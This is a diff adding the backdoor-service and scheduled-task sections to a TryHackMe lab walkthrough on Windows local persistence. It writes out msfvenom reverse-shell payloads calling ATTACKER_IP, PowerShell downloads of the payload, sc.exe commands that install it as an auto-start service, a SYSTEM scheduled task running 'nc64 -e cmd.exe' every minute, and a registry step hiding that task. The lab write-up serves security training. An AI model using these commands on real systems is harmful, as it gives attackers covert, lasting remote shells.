@@ -1,4 +1,4 @@
-# Windows Local Persistence — TryHackMe Walkthrough
+# Windows Local Persistence — TryHackMe Walkthrough Task 1 to 5
 **Difficulty:** Medium  
 **Author:** Meng Hor 
 
@@ -223,8 +223,102 @@ Q2.
 
 <img width="637" height="104" alt="Screenshot 2025-10-21 at 4 24 54 in the afternoon" src="https://github.com/user-attachments/assets/e90587e8-b34e-4cb7-831d-6ae348a0f0b0" />
 
+---
 
+## Abusing Services
 
+Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started.
+
+### Creating backdoor services
+
+On your attacker's machine, generate backdoor payload:
+```bash
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+```
+As well as starting a netcat listener on port ```4448```
+
+Transfer the ```rev-svc.exe``` to the victim's machine, I did this by serving up a simple HTTP server
+```bash
+python3 -m http.server 8000 --bind 0.0.0.0
+```
+
+On Windows Powershell run the following command, this should get the ```rev-svc.exe``` file:
+```bash
+Invoke-WebRequest -Uri "http://10.201.84.210:8000/rev-svc.exe" -OutFile "C:\Windows\rev-svc.exe"
+```
+Continuing on Windows Powershell:
+```bash
+sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start THMservice2
+```
+
+Doing this should get you a connection on the attacker's machine.
+```bash
+C:\Windows\system32>C:\flags\flag7.exe
+C:\flags\flag7.exe
+THM{REDACTED!!!}
+```
+Q1. 
+
+<img width="637" height="104" alt="Screenshot 2025-10-21 at 4 24 54 in the afternoon" src="https://github.com/user-attachments/assets/2b416a98-9d49-4d54-98fd-06ec34e5af2b" />
+
+### Modifying existing services
+
+For this task we also want to create a reverse shell script via msfvenom:
+```bash
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
+```
+Once again, we would also want to start a nc listener on port ```5558```
+
+Copy the rev-svc2.exe to our victim's machine just like before:
+```bash
+Invoke-WebRequest -Uri "http://10.201.84.210:8000/rev-svc2.exe" -OutFile "C:\Windows\rev-svc2.exe"
+```
+To reconfigure "THMservice3" parameters, we can use the following command:
+```bash
+C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+```
+
+This should gets us in.
+```bash
+C:\Windows\system32>C:\flags\flag8.exe
+C:\flags\flag8.exe
+THM{REDACTED!!!}
+```
+Q2. 
+
+<img width="621" height="105" alt="flag8" src="https://github.com/user-attachments/assets/a4b1bbe2-e1c3-46f8-a55b-4ab22d9fff96" />
+
+## Abusing Scheduled Tasks
+
+## Task Scheduler 
+
+In the Victim's machine create a task schedule that runs every 1 minute:
+```bash
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+```
+Open the registry editor by:
+```bash
+C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
+```
+And go to ```HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\```
+We will want to delete its security descriptor.
+
+Going to our attacker's machine and start up a netcat listener on port ```4449```
+
+We should get our flag.
+```bash
+C:\Windows\system32>C:\flags\flag9.exe
+C:\flags\flag9.exe
+THM{REDACTED!!!}
+```
+
+Q1. 
+<img width="621" height="105" alt="flag9" src="https://github.com/user-attachments/assets/6b65d0ce-034d-4d1c-acbd-5ca49216458e" />
+
+---
+
+Thank you for taking the time to read through my walkthrough.
 
 
 
